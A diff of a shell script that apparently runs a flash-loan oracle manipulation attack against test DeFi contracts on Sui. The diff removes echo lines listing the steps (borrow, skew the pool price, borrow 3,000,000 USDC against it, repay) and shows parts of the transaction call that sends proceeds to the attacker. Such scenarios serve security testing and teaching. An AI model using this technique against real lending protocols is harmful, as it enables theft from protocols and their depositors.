@@ -10,37 +10,16 @@ set -e
 source .env
 
 # Setup Fresh Environment if needed
-echo ""
-echo "╔══════════════════════════════════════════════════════════════════╗"
-echo "║                                                                  ║"
-echo "║         🎯 SCENARIO D: Oracle Manipulation Attack 🎯             ║"
-echo "║                                                                  ║"
-echo "╚══════════════════════════════════════════════════════════════════╝"
-echo ""
 
 ATTACKER=$(sui client active-address)
 USDC_TYPE="$PACKAGE_ID::usdc::USDC"
 WETH_TYPE="$PACKAGE_ID::weth::WETH"
-
-echo "📋 Environment Check:"
-echo "   Package ID:       $PACKAGE_ID"
-echo "   Flash Loan Pool:  $FLASH_LOAN_POOL_USDC"
-echo "   Oracle Pool:      $ATTACK_DEX_POOL"
-echo "   Lending Market:   $ATTACK_MARKET"
-echo "   Attacker:         $ATTACKER"
-echo ""
+ATTACK_DEX_POOL=$DEX_POOL_WETH_USDC
+ATTACK_MARKET=$MARKET_USDC
 
 # ============================================================================
 # STEP 2: Execute Oracle Manipulation Attack (Single PTB)
 # ============================================================================
-
-echo "🚀 Executing Oracle Manipulation Attack..."
-echo "   1. Flash Loan 2,500,000 USDC"
-echo "   2. Swap 2,000,000 USDC -> WETH on Oracle Pool (Manipulate Price)"
-echo "   3. Supply 10 WETH Collateral"
-echo "   4. Borrow 3,000,000 USDC (using manipulated oracle)"
-echo "   5. Repay Flash Loan"
-echo ""
 
 # Amounts
 FLASH_LOAN_AMOUNT=2500000000000  # 2,500,000 USDC (6 decimals)
@@ -87,7 +66,3 @@ sui client ptb \
     \
     --transfer-objects "[position, loan_coin]" @$ATTACKER \
     --gas-budget 100000000 --json
-
-echo ""
-echo "✅ Oracle Manipulation Attack Executed Successfully!"
-echo ""
